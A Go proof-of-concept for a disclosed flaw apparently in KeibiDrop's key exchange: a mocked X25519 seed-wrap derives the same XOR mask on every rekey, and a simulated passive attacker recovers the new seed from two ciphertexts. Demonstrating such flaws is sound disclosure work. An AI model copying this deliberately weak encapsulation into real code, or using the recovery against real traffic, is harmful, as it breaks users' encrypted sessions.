// ABOUTME: PoC for KD-2026-002 X25519 keystream reuse breaking forward secrecy on rekey.
// ABOUTME: Run standalone with: go run repro_x25519_rekey.go

//go:build ignore

package main

import (
	"bytes"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha512"
	"fmt"
	"io"

	"golang.org/x/crypto/hkdf"
)

const seedSize = 32

// --- MOCKING KEIBIDROP INTERNAL FUNCTIONS ---

// kbc.GenerateX25519Keypair
func GenerateX25519Keypair() (*ecdh.PrivateKey, *ecdh.PublicKey, error) {
	priv, err := ecdh.X25519().GenerateKey(rand.Reader)
	if err != nil {
		return nil, nil, err
	}
	return priv, priv.PublicKey(), nil
}

// kbc.X25519Encapsulate (The Vulnerable Implementation)
func X25519Encapsulate(seed []byte, senderPriv *ecdh.PrivateKey, recipientPub *ecdh.PublicKey) ([]byte, error) {
	shared, err := senderPriv.ECDH(recipientPub)
	if err != nil {
		return nil, err
	}

	// Vulnerability: nil salt and static info string on static identity keys
	hkdfReader := hkdf.New(sha512.New, shared, nil, []byte("x25519-shared-seed-wrap"))

	mask := make([]byte, len(seed))
	io.ReadFull(hkdfReader, mask)

	ciphertext := make([]byte, len(seed))
	for i := 0; i < len(seed); i++ {
		ciphertext[i] = seed[i] ^ mask[i]
	}
	return ciphertext, nil
}

// kbc.GenerateSeed (Helper for deterministic readable seeds in the PoC)
func GenerateMockSeed(data string) []byte {
	seed := make([]byte, seedSize)
	copy(seed, []byte(data))
	return seed
}

func main() {
	fmt.Println("=== Phase 1: session.InitSession() ===")
	// Alice and Bob initialize their sessions and generate long-lived session keys
	alicePriv, _, _ := GenerateX25519Keypair()
	_, bobPub, _ := GenerateX25519Keypair()
	fmt.Println("[+] Alice and Bob generated their static session keys.")

	fmt.Println("\n=== Phase 2: PerformOutboundHandshake() ===")
	// Alice generates the first seed for the connection
	initialSeed := GenerateMockSeed("SEED_1:INITIAL_HANDSHAKE_DATA_XX")

	// Alice encapsulates it using her session private key and Bob's session public key
	handshakeCiphertext, _ := X25519Encapsulate(initialSeed, alicePriv, bobPub)
	fmt.Printf("[>] Transmitting C1 (Handshake): %x\n", handshakeCiphertext)

	fmt.Println("\n... 1GB of data transferred. Threshold reached ...")

	fmt.Println("\n=== Phase 3: CreateRekeyRequest() ===")
	// Alice generates a NEW seed for forward secrecy
	rekeySeed := GenerateMockSeed("SEED_2:REKEY_EPOCH_1_SECRET_KEYX")

	// VULNERABILITY: Alice encapsulates the new seed using the EXACT SAME session keys
	rekeyCiphertext, _ := X25519Encapsulate(rekeySeed, alicePriv, bobPub)
	fmt.Printf("[>] Transmitting C2 (Rekey):     %x\n", rekeyCiphertext)

	fmt.Println("\n==================================================")
	fmt.Println("              ATTACKER PERSPECTIVE")
	fmt.Println("==================================================")

	// 1. The attacker passively intercepts C1 and C2 from the wire.
	// They XOR the two ciphertexts together.
	xorResult := make([]byte, seedSize)
	for i := 0; i < seedSize; i++ {
		xorResult[i] = handshakeCiphertext[i] ^ rekeyCiphertext[i]
	}

	// 2. The attacker uses known-plaintext to recover the rekey seed.
	// If the attacker knows or can guess the initial seed (e.g., they forced a known state,
	// or the initial seed is predictable/captured via side-channel), the rekey is broken.
	knownInitialSeed := GenerateMockSeed("SEED_1:INITIAL_HANDSHAKE_DATA_XX")

	recoveredRekeySeed := make([]byte, seedSize)
	for i := 0; i < seedSize; i++ {
		// P2 = (C1 ^ C2) ^ P1
		recoveredRekeySeed[i] = xorResult[i] ^ knownInitialSeed[i]
	}

	fmt.Printf("\n[!] ATTACK SUCCESSFUL\n")
	fmt.Printf("Original Rekey Seed:  %s\n", rekeySeed)
	fmt.Printf("Recovered Rekey Seed: %s\n", recoveredRekeySeed)

	if bytes.Equal(recoveredRekeySeed, rekeySeed) {
		fmt.Println("\n[CRITICAL] Result: Perfect plaintext recovery.")
		fmt.Println("The 'Forward Secrecy' rekey mechanism provided 0 bits of additional X25519 security.")
	}
}
